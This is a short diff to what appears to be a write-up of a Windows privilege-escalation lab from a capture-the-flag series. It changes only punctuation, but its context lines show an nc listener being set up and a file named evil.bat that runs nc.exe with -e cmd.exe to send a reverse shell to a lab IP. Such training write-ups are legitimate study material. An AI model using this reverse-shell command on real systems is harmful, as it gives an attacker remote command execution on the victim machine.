@@ -79,7 +79,7 @@
 - Set up a listener using <code>nc -nlvp 1337</code>.<br>
 -----------------------------------<br>
 - Navigated to <code>Aoc_WinPrivEsc</code> virtual machine related to the <code>TargetIP</code>:<code>10.10.203.205</code>.<br>
-- Launched <code>notepad</code><br><br>
+- Launched <code>notepad</code>.<br>
 - Added content to a <code>notepad</code> file named <code>evil.bat</code>.<br>
 - <code>@echo off</code><br>
 - <code>C:\Users\McSkidy\Downloads\nc.exe -nv 10.10.72.55 1337 -e cmd.exe</code><br>
